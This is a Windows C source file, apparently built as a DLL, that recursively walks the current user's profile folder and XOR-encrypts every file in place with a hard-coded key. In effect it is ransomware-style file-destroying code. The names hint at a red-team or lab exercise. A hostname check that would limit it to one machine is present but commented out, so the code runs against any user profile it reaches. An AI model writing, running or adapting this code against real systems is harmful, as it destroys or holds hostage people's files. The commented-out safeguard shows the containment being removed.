// dllmain.cpp : Defines the entry point for the DLL application
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winerror.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <knownfolders.h>

#define KEY "GoodJobTeam!"
#define ALLOWED_HOSTNAME "XA-WS01"

// XOR each byte with key
void xor_encrypt_decrypt(unsigned char* data, size_t len, const char* key) {
    size_t klen = strlen(key);
    for (size_t i = 0; i < len; i++)
        data[i] ^= key[i % klen];
}

void process_file(const char* filepath) {
    FILE* f = fopen(filepath, "rb+");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char* buf = (unsigned char*)malloc(size);
    if (!buf) { fclose(f); return; }

    fread(buf, 1, size, f);
    xor_encrypt_decrypt(buf, size, KEY);

    rewind(f);
    fwrite(buf, 1, size, f);

    fclose(f);
    free(buf);

    printf("Processed: %s\n", filepath);
}

void process_folder(const char* path) {
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*.*", path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        // Skip AppData folder
        if (strcmp(fd.cFileName, "AppData") == 0)
            continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            process_folder(fullpath);  // recurse
        }
        else {
            process_file(fullpath);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

void main() {
    // Safety check: hostname
    char host[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(host);

    /***
    if (!GetComputerNameA(host, &size) || strcmp(host, ALLOWED_HOSTNAME) != 0) {
        fprintf(stderr, "Not authorized: host must be %s\n", ALLOWED_HOSTNAME);
        return;
    }
    ***/

    char folder[MAX_PATH];

    PWSTR profile = NULL;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &profile))) {
        wcstombs(folder, profile, sizeof(folder));
        CoTaskMemFree(profile);
    }
    else {
        fprintf(stderr, "Could not get user profile folder.\n");
        return;
    }

    process_folder(folder);
    printf("Done.\n");
    return;
}